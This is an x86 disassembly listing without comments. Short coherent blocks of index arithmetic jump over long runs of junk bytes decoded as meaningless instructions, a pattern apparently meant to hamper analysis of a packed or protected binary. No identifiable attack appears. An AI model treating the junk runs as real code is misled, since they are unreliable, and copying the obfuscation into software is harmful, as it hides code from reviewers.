  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
  406545:	sbb    dl,BYTE PTR [edx]
  406547:	aas    
  406548:	xor    DWORD PTR [esi+0x7c77627f],edi
  40654e:	call   FWORD PTR [ebx+0x129e1818]
  406554:	sbb    BYTE PTR [eax],bl
  406556:	out    0x32,al
  406558:	xchg   edi,eax
  406559:	fmulp  st(7),st
  40655b:	jae    0x4065c6
  40655d:	mov    bh,0x7d
  40655f:	lahf   
  406560:	cmc    
  406561:	(bad)  
  406562:	fnstenv [esi+0x49]
  406565:	and    DWORD PTR [ebx-0x53fc65bc],esp
  40656b:	outs   dx,BYTE PTR ds:[esi]
  40656c:	mov    gs,WORD PTR [esi-0x2877dc3c]
  406572:	(bad)  
  406573:	cmp    ecx,DWORD PTR [ebx-0x4753b810]
  406579:	fmul   DWORD PTR [eax-0xc32002]
  40657f:	inc    ebx
  406580:	dec    esp
  406581:	jmp    0x406564
  406583:	mov    bl,0x7e
  406585:	pop    ebx
  406586:	fidiv  DWORD PTR [esi+0x12]
  406589:	inc    esi
  40658a:	rcr    DWORD PTR [ebp+0x3b],1
  40658d:	cs out 0x45,eax
  406590:	pop    ebx
  406591:	gs push ss
  406593:	icebp  
  406594:	cmp    al,BYTE PTR [eax-0x72e49d09]
  40659a:	adc    dl,BYTE PTR [edi-0x67]
  40659d:	out    dx,eax
  40659e:	or     ch,BYTE PTR [eax]
  4065a0:	xchg   ecx,eax
  4065a1:	(bad)  
  4065a2:	in     eax,dx
  4065a3:	mov    cl,0xa4
  4065a5:	hlt    
  4065a6:	fst    DWORD PTR [edi+eiz*4-0x6f9e04ad]
  4065ad:	xchg   ecx,eax
  4065ae:	(bad)  
  4065af:	repz mov esp,0x231463aa
  4065b5:	stos   DWORD PTR es:[edi],eax
  4065b6:	add    eax,0xc00fe5e3
  4065bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065bd:	in     eax,0x50
  4065bf:	xchg   edi,eax
  4065c0:	shr    DWORD PTR [edx],cl
  4065c2:	mov    ds:0x874e9a38,al
  4065c7:	fsave  [ebp-0xfe12da0]
  4065ce:	inc    edi
  4065cf:	jmp    0x243:0xcf3c87b0
  4065d6:	or     DWORD PTR [ebp+0x1d],esp
  4065d9:	xchg   ebx,eax
  4065da:	inc    esi
  4065db:	push   ds
  4065dc:	cmp    dh,bl
  4065de:	xchg   BYTE PTR [edi],bh
  4065e0:	ja     0x4065d3
  4065e2:	mov    ebx,DWORD PTR [esi-0x36]
  4065e5:	test   eax,0xe2f44e0b
  4065ea:	xor    eax,DWORD PTR [ecx-0x59]
  4065ed:	sub    dl,dh
  4065ef:	or     eax,0x1fde5d18
  4065f4:	dec    ecx
  4065f5:	jl     0x406587
  4065f7:	cmp    eax,0xab2046d0
  4065fc:	lock repz and ecx,DWORD PTR [ebp+0x4ac1ba96]
  406604:	mov    eax,0x9d30b234
  406609:	test   esp,ebp
  40660b:	out    0x93,eax
  40660d:	xchg   edx,eax
  40660e:	adc    al,0x15
  406610:	retf   0x60af
  406613:	xor    bh,BYTE PTR [ebp-0x36f3f817]
  406619:	sbb    DWORD PTR [eax+0x7],ebx
  40661c:	out    dx,eax
  40661d:	scas   al,BYTE PTR es:[edi]
  40661e:	inc    ebp
  40661f:	cld    
  406620:	fs jb  0x40660b
  406623:	ret    0x5e3f
  406626:	cs jecxz 0x40669e
  406629:	imul   ecx,DWORD PTR [ecx],0xcb740e22
  40662f:	add    esi,DWORD PTR [edx+0x16]
  406632:	pushf  
  406633:	ror    DWORD PTR [esi],0x16
  406636:	sbb    eax,0xd8ecfeea
  40663b:	adc    DWORD PTR [ecx+0x4e],ebx
  40663e:	mov    esp,0xacd4e17b
  406643:	push   esi
  406644:	sbb    BYTE PTR [eax-0x9],dl
  406647:	and    al,0xc0
  406649:	(bad)  
  40664b:	cmp    ebx,DWORD PTR [eax-0x5d]
  40664e:	push   edi
  40664f:	sahf   
  406650:	repz push esi
  406652:	and    ebp,eax
  406654:	sti    
  406655:	stos   BYTE PTR es:[edi],al
  406656:	rcr    eax,1
  406658:	adc    DWORD PTR [edx],edi
  40665a:	scas   eax,DWORD PTR es:[edi]
  40665b:	jns    0x4066a0
  40665d:	mov    edi,0xf2e246bd
  406662:	ins    DWORD PTR es:[edi],dx
  406663:	pop    ss
  406664:	int3   
  406665:	add    BYTE PTR ds:0xfee3d562,dl
  40666b:	into   
  40666c:	dec    edx
  40666d:	test   al,0x38
  40666f:	mov    dl,0x90
  406671:	das    
  406672:	into   
  406673:	(bad)  
  406675:	test   al,0x82
  406677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406678:	xchg   ebp,eax
  406679:	imul   edx,DWORD PTR [ecx+0x516bf452],0xffffff95
  406680:	popf   
  406681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406682:	xchg   esp,eax
  406683:	xchg   BYTE PTR [eax+0x1675eab1],al
  406689:	(bad)  
  40668a:	jmp    0x4066ed
  40668c:	test   al,0x5d
  40668e:	mov    edx,DWORD PTR [eax-0x4b891714]
  406694:	xchg   BYTE PTR [eax-0x26e87e78],ch
  40669a:	outs   dx,DWORD PTR ds:[esi]
  40669b:	das    
  40669c:	rol    dl,0x48
  40669f:	shl    BYTE PTR [edx+0x3ce518d6],1
  4066a5:	jns    0x4066e3
  4066a7:	je     0x4066b7
  4066a9:	push   0x5da07c75
  4066ae:	and    BYTE PTR [eax+ebp*1-0x10],al
  4066b2:	data16 fsubr QWORD PTR [ecx-0x9]
  4066b6:	dec    edx
  4066b7:	scas   al,BYTE PTR es:[edi]
  4066b8:	inc    esi
  4066b9:	call   DWORD PTR [ebx-0x13b4ac73]
  4066bf:	imul   ebp,DWORD PTR [ebp-0x5b],0x9009ae31
  4066c6:	dec    ebx
  4066c7:	pop    ebp
  4066c8:	fcomp  QWORD PTR [esi]
  4066ca:	fwait
  4066cb:	sbb    dl,BYTE PTR [edx+eiz*8-0x2a5d2131]
  4066d2:	mov    eax,ds:0xfd7091d8
  4066d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066d8:	stos   BYTE PTR es:[edi],al
  4066d9:	cmc    
  4066da:	ficom  DWORD PTR [esi-0x3f1cb28d]
  4066e0:	test   al,0x70
  4066e2:	cmp    eax,0x43331ec5
  4066e7:	pop    ebp
  4066e8:	push   ds
  4066e9:	inc    eax
  4066ea:	push   ebp
  4066eb:	push   eax
  4066ec:	sub    ah,BYTE PTR [edi]
  4066ee:	arpl   WORD PTR [esi-0x61a3a3e4],si
  4066f4:	loopne 0x40667f
  4066f6:	inc    ebx
  4066f7:	pop    edi
  4066f8:	out    0x56,eax
  4066fa:	jbe    0x406701
  4066fc:	lock rol BYTE PTR [ebx+ecx*8+0x53],0xd
  406702:	dec    edi
  406703:	dec    ebp
  406704:	xchg   dl,cl
  406706:	das    
  406707:	mov    WORD PTR [edx+0x18b14cda],gs
  40670d:	sub    DWORD PTR ds:0x20346a61,edx
  406713:	fs clc 
  406715:	push   ds
  406716:	dec    edi
  406717:	stos   BYTE PTR es:[edi],al
  406718:	and    eax,0x89509829
  40671d:	dec    ebp
  40671e:	or     al,0xf4
  406720:	fst    QWORD PTR [eax]
  406722:	shr    BYTE PTR [ecx-0xe],1
  406725:	(bad)  [edx+0x3d]
  406728:	in     al,0x97
  40672a:	addps  xmm2,XMMWORD PTR [edx+0x2e]
  40672e:	adc    DWORD PTR [edx+0x30a10d6b],0xffffff9f
  406735:	dec    edi
  406736:	les    ebp,FWORD PTR [edi]
  406738:	push   0x1aa0c85a
  40673d:	(bad)  [eax+ebx*1+0x4b]
  406741:	cmp    BYTE PTR [edi],dl
  406743:	test   al,0xae
  406745:	sbb    al,0x98
  406747:	test   BYTE PTR [ebp+eax*2-0x22],ah
  40674b:	div    bl
  40674d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40674e:	cmc    
  40674f:	sbb    ecx,DWORD PTR [edx]
  406751:	sub    DWORD PTR [eax],ebx
  406753:	retf   
  406754:	adc    DWORD PTR ds:0x562a511e,ebx
  40675a:	push   edi
  40675b:	xor    eax,0xf15ac1e2
  406760:	sbb    al,0x6d
  406762:	jl     0x4066f2
  406764:	xor    BYTE PTR [ecx+ebx*2+0x7b],0xfa
  406769:	icebp  
  40676a:	out    0x47,al
  40676c:	std    
  40676d:	jae    0x4067b9
  40676f:	ins    BYTE PTR es:[edi],dx
  406770:	arpl   WORD PTR [esi-0xd],si
  406773:	inc    esi
  406774:	mov    eax,0x4c7839a6
  406779:	aam    0x36
  40677b:	jle    0x40676f
  40677d:	das    
  40677e:	daa    
  40677f:	lods   al,BYTE PTR ds:[esi]
  406780:	les    ebp,FWORD PTR [edi]
  406782:	sub    al,0x1f
  406784:	aad    0x58
  406786:	in     eax,0x82
  406788:	test   al,0x54
  40678a:	or     al,0x5a
  40678c:	imul   ebx,esp,0x78
  40678f:	(bad)  
  406791:	add    eax,0x77c2c62d
  406796:	or     BYTE PTR [edi],bl
  406798:	jl     0x4067b2
  40679a:	clc    
  40679b:	mov    bh,bl
  40679d:	add    eax,esi
  40679f:	sbb    al,0x34
  4067a1:	fnstenv [ecx+eax*2+0x4ed290fc]
  4067a8:	add    bh,BYTE PTR [eax+0x73]
  4067ab:	mov    ah,0x8d
  4067ad:	clc    
  4067ae:	jo     0x4067f5
  4067b0:	xor    dh,ah
  4067b2:	cmp    DWORD PTR ds:0x62dccc27,0x65
  4067b9:	push   esi
  4067ba:	mov    edi,0x3811efc1
  4067bf:	cli    
  4067c0:	ror    BYTE PTR [edi+0x79c7bb7d],cl
  4067c6:	xchg   esp,eax
  4067c7:	sub    ah,bl
  4067c9:	push   ebp
  4067ca:	cmp    eax,0x981be97f
  4067cf:	aad    0xf2
  4067d1:	popa   
  4067d2:	push   eax
  4067d3:	int3   
  4067d4:	in     al,0x1b
  4067d6:	daa    
  4067d7:	adc    esp,DWORD PTR [ebp-0x14]
  4067da:	xlat   BYTE PTR ds:[ebx]
  4067db:	(bad)  [ecx+0x29036ae3]
  4067e1:	rcl    BYTE PTR [edi+0x5a],1
  4067e4:	leave  
  4067e5:	pop    esp
  4067e6:	sub    edi,DWORD PTR [ebx-0x12]
  4067e9:	xor    eax,0xbccb370f
  4067ee:	jne    0x406847
  4067f0:	sbb    ebp,esi
  4067f2:	call   0x30f011f7
  4067f7:	jmp    0x13d5:0xb3877756
  4067fe:	ins    BYTE PTR es:[edi],dx
  4067ff:	xchg   DWORD PTR [esi-0x3a76467e],esi
  406805:	iret   
  406806:	mov    eax,DWORD PTR [esi+0x435f31e6]
  40680c:	out    0xe3,al
  40680e:	or     edi,DWORD PTR [esi-0x6b]
  406811:	ins    BYTE PTR es:[edi],dx
  406812:	aas    
  406813:	push   ebp
  406814:	enter  0x69c2,0x17
  406818:	lods   al,BYTE PTR ds:[esi]
  406819:	sbb    esi,DWORD PTR [edi]
  40681b:	lds    eax,FWORD PTR [esi-0x4584caca]
  406821:	fld    DWORD PTR ss:[ecx+ebp*2-0x16]
  406826:	in     eax,dx
  406827:	mov    eax,ds:0xcf947549
  40682c:	jge    0x406883
  40682e:	fwait
  40682f:	lahf   
  406830:	xor    al,0xab
  406832:	inc    eax
  406833:	pop    edx
  406834:	call   0xc60ef186
  406839:	cli    
  40683a:	add    al,0x56
  40683c:	lods   al,BYTE PTR ds:[esi]
  40683d:	inc    edi
  40683e:	xchg   ebp,eax
  40683f:	xchg   edx,eax
  406840:	fadd   DWORD PTR [edi]
  406842:	sbb    edx,DWORD PTR [ecx+0x7b34d496]
  406848:	mov    al,ds:0xefbfff7e
  40684d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40684e:	cld    
  40684f:	add    BYTE PTR [esp+ecx*8+0x61fc9b53],bh
  406856:	sub    DWORD PTR [edx+0x6],ebp
  406859:	aam    0x49
  40685b:	jnp    0x4067e2
  40685d:	shl    DWORD PTR [ebp+0x2],cl
  406860:	sub    al,0x57
  406862:	sbb    DWORD PTR [esp+eiz*2],ecx
  406865:	pop    ds
  406866:	jmp    0x574e273
  40686b:	cwde   
  40686c:	pop    esi
  40686d:	pusha  
  40686e:	mov    cl,ch
  406870:	aad    0x11
  406872:	stc    
  406873:	int3   
  406874:	push   esp
  406875:	inc    ecx
  406876:	sbb    cl,cl
  406878:	xor    edi,DWORD PTR [edi-0x33]
  40687b:	(bad)  
  40687d:	cmp    edi,DWORD PTR [eax+eax*2-0x7c]
  406881:	rol    BYTE PTR [ebx],cl
  406883:	push   0x7df6b800
  406888:	test   DWORD PTR [ebp+ecx*4+0x34],0x4984ca7e
  406890:	lahf   
  406891:	sub    DWORD PTR [eax+0x3],ebp
  406894:	call   0x29da1ea7
  406899:	sub    bh,bh
  40689b:	mov    bh,0x94
  40689d:	stos   DWORD PTR es:[edi],eax
  40689e:	loope  0x406874
  4068a0:	(bad)  
  4068a1:	sub    bh,BYTE PTR [ebp-0x55]
  4068a4:	test   BYTE PTR [ebp+0x5c],bh
  4068a7:	stos   DWORD PTR es:[edi],eax
  4068a8:	inc    ebp
  4068a9:	retf   
  4068aa:	xor    BYTE PTR [ecx+0x7ba18df7],cl
  4068b0:	or     BYTE PTR [eax],dl
  4068b2:	fidivr DWORD PTR [esi]
  4068b4:	mov    ds:0x36c24328,eax
  4068b9:	add    DWORD PTR [ebx],0x251cc76a
  4068bf:	jo     0x40689e
  4068c1:	mov    edi,0xaa166bf6
  4068c6:	push   esp
  4068c7:	xchg   ebx,eax
  4068c8:	cdq    
  4068c9:	test   eax,0x764dda26
  4068ce:	fist   DWORD PTR [ebx+0x169f4dc9]
  4068d4:	mov    bl,0x3a
  4068d6:	test   DWORD PTR [edi],esp
  4068d8:	xchg   edi,eax
  4068d9:	js     0x40695a
  4068db:	mov    al,ds:0x5f492a5
  4068e0:	sbb    bh,dl
  4068e2:	hlt    
  4068e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068e4:	mov    eax,ds:0x481c382f
  4068e9:	jge    0x406919
  4068eb:	jno    0x406964
  4068ed:	js     0x40693b
  4068ef:	mov    DWORD PTR [eax+0x6f],0xe2bcd0dd
  4068f6:	jmp    0xb779:0xb106da55
  4068fd:	pop    esi
  4068fe:	xchg   ebp,eax
  4068ff:	dec    ebp
  406900:	push   0x5ba2e80e
  406905:	push   ebx
  406906:	adc    eax,ebx
  406908:	mov    eax,ds:0x1e50b284
  40690d:	adc    al,0x58
  40690f:	(bad)  
  406910:	in     al,0x65
  406912:	mov    ebx,ss
  406914:	add    eax,0xe1c172c4
  406919:	push   ds
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0xbc995a7c
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	icebp  
  406981:	push   esi
  406982:	push   cs
  406983:	fisttp WORD PTR [esi-0x7ce787fe]
  406989:	pop    ss
  40698a:	jns    0x4069f7
  40698c:	sbb    esp,DWORD PTR ds:0x2df2a2a6
  406992:	es (bad) 
  406994:	jo     0x4069f1
  406996:	sub    edi,DWORD PTR [esi]
  406998:	jmp    0x169d3378
  40699d:	xchg   DWORD PTR [eax-0x3b151044],edi
  4069a3:	daa    
  4069a4:	test   al,0xc
  4069a6:	scas   eax,DWORD PTR es:[edi]
  4069a7:	push   esp
  4069a8:	imul   ecx,esp,0xe2a625d1
  4069ae:	sub    DWORD PTR es:0x5a09b8cb,ecx
  4069b5:	inc    edx
  4069b6:	icebp  
  4069b7:	and    esi,DWORD PTR [edi]
  4069b9:	fiadd  WORD PTR [eax-0x665ede41]
  4069bf:	xor    ch,BYTE PTR [ecx-0x32]
  4069c2:	xchg   BYTE PTR [ebp-0x67],cl
  4069c5:	dec    edi
  4069c6:	jg     0x4069a3
  4069c8:	mov    cl,0x55
  4069ca:	jge    0x4069cb
  4069cc:	addr16 out dx,eax
  4069ce:	test   DWORD PTR [ebp+0x5d499ac7],esi
  4069d4:	lahf   
  4069d5:	jmp    0x298ca49b
  4069da:	sbb    cl,ah
  4069dc:	pop    ebp
  4069dd:	mov    edi,0xc1130861
  4069e2:	push   ebx
  4069e3:	ins    DWORD PTR es:[edi],dx
  4069e4:	pop    edx
  4069e5:	mov    eax,0x1d242d06
  4069ea:	ds lahf 
  4069ec:	xor    BYTE PTR [esp+esi*4+0x7e307d61],cl
  4069f3:	(bad)  
  4069f4:	adc    ebp,DWORD PTR [esi+0x5a]
  4069f7:	cmp    DWORD PTR [ebp+0x48cf454f],ecx
  4069fd:	jo     0x406a0c
  4069ff:	xchg   ebp,eax
  406a00:	cli    
  406a01:	aaa    
  406a02:	lahf   
  406a03:	xor    bh,BYTE PTR [ecx-0x6e]
  406a06:	iret   
  406a07:	push   ebx
  406a08:	push   ebx
  406a09:	push   0x43
  406a0b:	rcl    DWORD PTR ss:[ecx-0x702fde92],cl
  406a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a13:	ud0    esi,DWORD PTR [edi]
  406a16:	dec    edi
  406a17:	xchg   edi,eax
  406a18:	loope  0x4069f0
  406a1a:	xor    BYTE PTR [ecx+0x62],0x29
  406a1e:	loope  0x406a6a
  406a20:	push   ebx
  406a21:	cmp    BYTE PTR [edx+0xe6b748d],0xff
  406a28:	mov    ds:0x7c949ac2,al
  406a2d:	jmp    0x8a8cca3d
  406a32:	in     al,dx
  406a33:	repnz inc edi
  406a35:	iret   
  406a36:	loope  0x4069db
  406a38:	(bad)
  406a3c:	adc    edx,eax
  406a3e:	imul   DWORD PTR [edx+0x43]
  406a41:	(bad)  
  406a42:	arpl   WORD PTR ds:0xdfff92a2,di
  406a48:	imul   edx,DWORD PTR [ebp-0x31bc1916],0x70ac5614
  406a52:	cld    
  406a53:	inc    edi
  406a54:	sbb    al,ah
  406a56:	outs   dx,DWORD PTR ds:[esi]
  406a57:	aam    0xfa
  406a59:	or     BYTE PTR [eax-0x77],ch
  406a5c:	vsubpd xmm5,xmm7,XMMWORD PTR [ecx+0x59a11858]
  406a64:	jg     0x406a9b
  406a66:	and    ch,BYTE PTR [ebx]
  406a68:	sub    DWORD PTR [esi],esi
  406a6a:	rcl    BYTE PTR [edi+0x18],0xb7
  406a6e:	rcl    ecx,1
  406a70:	cmp    DWORD PTR [ecx],eax
  406a72:	fst    DWORD PTR [eax+0x26215b56]
  406a78:	sar    DWORD PTR [eax],1
  406a7a:	out    0xcd,eax
  406a7c:	or     edx,DWORD PTR [ebp-0x6e033c61]
  406a82:	das    
  406a83:	dec    eax
  406a84:	dec    ebx
  406a85:	test   eax,0x1661a888
  406a8a:	fs je  0x406a1e
  406a8d:	popf   
  406a8e:	out    dx,eax
  406a8f:	and    ecx,DWORD PTR [esi+0x4a]
  406a92:	in     eax,0x96
  406a94:	inc    esp
  406a95:	jmp    0x589c44de
  406a9a:	mul    DWORD PTR [eax+edi*1]
  406a9d:	bound  esp,QWORD PTR [esi-0x58]
  406aa0:	or     ah,BYTE PTR [eax+edi*2+0x67]
  406aa4:	les    esi,FWORD PTR [eax+0x65789b81]
  406aaa:	lods   eax,DWORD PTR ds:[esi]
  406aab:	fbld   TBYTE PTR [edi-0x198e4e7b]
  406ab1:	jmp    0x9399:0xcf156c47
  406ab8:	sub    DWORD PTR [ebx-0x11],ebx
  406abb:	inc    ecx
  406abc:	pop    edi
  406abd:	je     0x406a7e
  406abf:	inc    ebp
  406ac0:	push   esi
  406ac1:	mov    BYTE PTR [ecx-0x47ccadb7],bh
  406ac7:	std    
  406ac8:	(bad)  
  406ac9:	sbb    cl,BYTE PTR [esi+0x28f773f0]
  406acf:	lock fisttp DWORD PTR [edx+0x1d9f7f6e]
  406ad6:	fs mov cl,0x9d
  406ad9:	or     ecx,DWORD PTR [esi]
  406adb:	push   ss
  406adc:	inc    eax
  406add:	mov    al,0x51
  406adf:	mov    ds:0x7f847f15,eax
  406ae4:	mov    ebx,?
  406ae6:	ret    0x5d10
  406ae9:	pop    ds
  406aea:	mov    eax,0xa29c78ad
  406aef:	cmp    esi,DWORD PTR [eax-0x7a]
  406af2:	xchg   ebx,eax
  406af3:	pusha  
  406af4:	scas   al,BYTE PTR es:[edi]
  406af5:	pop    esp
  406af6:	sub    al,0x1a
  406af8:	xchg   edx,eax
  406af9:	icebp  
  406afa:	dec    esi
  406afb:	addr16 rcl bh,cl
  406afe:	mov    esi,0x90113eac
  406b03:	jp     0x406b73
  406b05:	xor    BYTE PTR [esi-0x70],dh
  406b08:	imul   eax,DWORD PTR [ebp+0x21831c5c],0x235158c3
  406b12:	mov    ch,0x5c
  406b14:	out    0x7,eax
  406b16:	call   0xcbdb:0x2c0b2a99
  406b1d:	sbb    cl,BYTE PTR [ebp-0x39]
  406b20:	sti    
  406b21:	or     BYTE PTR [edi+eax*8-0x3bea9c48],cl
  406b28:	or     al,BYTE PTR [eax]
  406b2a:	loop   0x406b83
  406b2c:	and    eax,0x170ec830
  406b31:	push   0x12cfa9ff
  406b36:	fcmovbe st,st(3)
  406b38:	outs   dx,BYTE PTR ds:[esi]
  406b39:	push   ebx
  406b3a:	fmul   QWORD PTR [edx]
  406b3c:	push   esp
  406b3d:	fwait
  406b3e:	inc    ebp
  406b3f:	fadd   DWORD PTR ds:0x6506011a
  406b45:	ret    
  406b46:	inc    eax
  406b47:	sub    esi,DWORD PTR [ecx]
  406b49:	je     0x406ad2
  406b4b:	push   ecx
  406b4c:	es adc eax,0xa0fa69ee
  406b52:	pop    ss
  406b53:	inc    ecx
  406b54:	lds    ebp,FWORD PTR [edx-0x4c7a307b]
  406b5a:	or     al,al
  406b5c:	call   0x8ed5ce5f
  406b61:	loope  0x406bd0
  406b63:	out    0x9b,al
  406b65:	mov    ecx,0x895cbfb9
  406b6a:	add    eax,0x41d8907a
  406b6f:	cwde   
  406b70:	or     BYTE PTR [esi],cl
  406b72:	push   ebp
  406b73:	(bad)  
  406b74:	call   0x37a44301
  406b79:	inc    edx
  406b7a:	and    ah,BYTE PTR [ecx+esi*8-0x540b3577]
  406b81:	dec    edx
  406b82:	xchg   DWORD PTR [edi-0x72ac9298],edx
  406b88:	popf   
  406b89:	rcr    ch,cl
  406b8b:	jle    0x406b85
  406b8d:	push   ebx
  406b8e:	push   0x20
  406b90:	pop    es
  406b91:	or     edi,edi
  406b93:	adc    al,0xdf
  406b95:	sti    
  406b96:	push   ecx
  406b97:	std    
  406b98:	sub    DWORD PTR [eax-0x6aef6e60],ebp
  406b9e:	inc    eax
  406b9f:	sar    DWORD PTR cs:[eax],1
  406ba2:	mov    WORD PTR [ebx+0xac4297b],es
  406ba8:	ins    BYTE PTR es:[edi],dx
  406ba9:	ins    BYTE PTR es:[edi],dx
  406baa:	xor    eax,0xce422775
  406baf:	pop    eax
  406bb0:	jno    0x406bad
  406bb2:	push   ecx
  406bb3:	mov    bl,0x1a
  406bb5:	aam    0xf8
  406bb7:	mov    edx,0xac769fdd
  406bbc:	cli    
  406bbd:	and    ecx,0xe78872a5
  406bc3:	mov    fs,WORD PTR [ebx+0x7a]
  406bc6:	stos   BYTE PTR es:[edi],al
  406bc7:	out    0x15,al
  406bc9:	push   0x27fd1f9f
  406bce:	jmp    0x5c1a:0x7f0dc002
  406bd5:	sbb    al,0xd6
  406bd7:	cdq    
  406bd8:	and    eax,0x9238fb1f
  406bdd:	ret    
  406bde:	pop    ebp
  406bdf:	mov    ah,0x98
  406be1:	aaa    
  406be2:	addr16 push edx
  406be4:	retf   
  406be5:	ds sbb esp,ecx
  406be8:	sub    DWORD PTR [ecx],0xec911286
  406bee:	pop    esp
  406bef:	imul   ecx,DWORD PTR es:[edi+0x77737331],0xffffff88
  406bf7:	mov    esi,0x2d7f33eb
  406bfc:	inc    edi
  406bfd:	lods   eax,DWORD PTR ds:[esi]
  406bfe:	lods   al,BYTE PTR ds:[esi]
  406bff:	jmp    0xbada:0x4ea8fd98
  406c06:	mov    ds:0x483f1895,al
  406c0b:	or     esp,DWORD PTR [eax+0x5a]
  406c0e:	mov    ds:0xeef37e8e,eax
  406c13:	(bad)  
  406c14:	out    dx,eax
  406c15:	rcr    bl,cl
  406c17:	and    esi,ebx
  406c19:	shl    ecx,0xa
  406c1c:	popf   
  406c1d:	xor    al,0xeb
  406c1f:	das    
  406c20:	dec    ebp
  406c21:	xchg   esp,eax
  406c22:	pop    esi
  406c23:	sti    
  406c24:	ss out dx,eax
  406c26:	push   edx
  406c27:	cdq    
  406c28:	std    
  406c29:	and    DWORD PTR [edx+0x53f3ef64],esp
  406c2f:	push   ecx
  406c30:	sub    al,0x1
  406c32:	inc    ebp
  406c33:	dec    esp
  406c34:	sub    edi,eax
  406c36:	retf   0x3b76
  406c39:	pop    ds
  406c3a:	xor    esi,edx
  406c3c:	ret    0x69d7
  406c3f:	bnd jno 0x406c09
  406c42:	shr    DWORD PTR [edx],0x59
  406c45:	jns    0x406c1c
  406c47:	xchg   esi,eax
  406c48:	aam    0x21
  406c4a:	call   0x49eafded
  406c4f:	outs   dx,BYTE PTR ds:[esi]
  406c50:	dec    esi
  406c51:	xor    al,0xa0
  406c53:	aaa    
  406c54:	fiadd  WORD PTR [eax+0x75d43de]
  406c5a:	jno    0x406c0c
  406c5c:	aaa    
  406c5d:	jbe    0x406c74
  406c5f:	nop
  406c60:	push   edi
  406c61:	sbb    esi,DWORD PTR [ebp-0x2e413ea2]
  406c67:	aas    
  406c68:	push   ebx
  406c69:	btc    DWORD PTR [eax+0x55],ebx
  406c6d:	cmp    ch,BYTE PTR [edx+0x6563e435]
  406c73:	push   ds
  406c74:	or     BYTE PTR [ebx],bh
  406c76:	sar    BYTE PTR [eax+0x53],0x86
  406c7a:	push   0x2319d30d
  406c7f:	int3   
  406c80:	int3   
  406c81:	js     0x406c87
  406c83:	(bad)  
  406c85:	jmp    0x6e0f2541
  406c8a:	mov    edi,0x9b487591
  406c8f:	ins    DWORD PTR es:[edi],dx
  406c90:	sbb    BYTE PTR [ecx+0x68441e66],al
  406c96:	pop    ebx
  406c97:	loop   0x406cc0
  406c99:	out    dx,eax
  406c9a:	sub    eax,0x3d49d253
  406c9f:	jmp    0x2989:0x7ac27717
  406ca6:	lods   al,BYTE PTR ds:[esi]
  406ca7:	jns    0x406c70
  406ca9:	adc    al,0xcb
  406cab:	mov    ebp,0x8879abd4
  406cb0:	inc    eax
  406cb1:	mov    cl,0x66
  406cb3:	adc    ah,bh
  406cb5:	cmp    ebp,DWORD PTR [eax]
  406cb7:	fstp   st(4)
  406cb9:	sbb    ah,cl
  406cbb:	push   ss
  406cbc:	cs jg  0x406c62
  406cbf:	push   ecx
  406cc0:	in     eax,0x6c
  406cc2:	mov    ebx,0x32dd811f
  406cc7:	push   ecx
  406cc8:	leave  
  406cc9:	mov    edx,0xd4364eda
  406cce:	mov    ds:0x9f17e316,eax
  406cd3:	idiv   BYTE PTR [ebp+0x6b]
  406cd6:	(bad)  
  406cd7:	retf   
  406cd8:	push   0xdbde825e
  406cdd:	pusha  
  406cde:	pop    ebx
  406cdf:	pop    ebp
  406ce0:	add    edi,DWORD PTR [edx+ebp*4]
  406ce3:	fst    QWORD PTR [eax-0x8]
  406ce6:	fld    TBYTE PTR [edi+0x67a0fbc0]
  406cec:	xchg   esp,eax
  406ced:	adc    al,0x68
  406cef:	mov    dh,dh
  406cf1:	loop   0x406c7f
  406cf3:	icebp  
  406cf4:	sti    
  406cf5:	add    DWORD PTR [ebp+ebp*2+0x73],edi
  406cf9:	jns    0x406d42
  406cfb:	sbb    DWORD PTR [bx-0x2a],ebp
  406cff:	and    BYTE PTR [ebx],ah
  406d01:	add    ah,dh
  406d03:	and    ebx,edi
  406d05:	sub    eax,0xe082ac27
  406d0a:	pop    ss
  406d0b:	cs fmulp st(7),st
  406d0e:	repnz int3 
  406d10:	adc    DWORD PTR [ecx+0x1c],esp
